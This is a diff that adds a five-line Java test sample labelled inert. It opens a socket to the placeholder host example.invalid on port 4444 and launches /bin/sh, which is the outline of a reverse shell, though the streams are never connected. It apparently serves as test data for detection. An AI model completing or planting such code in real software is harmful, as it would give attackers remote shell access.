@@ -1,0 +1,5 @@
+// INERT TEST SAMPLE
+java.net.Socket s = new Socket("example.invalid", 4444);
+Process p = Runtime.getRuntime().exec("/bin/sh");
+p.getInputStream(); s.getOutputStream();
+
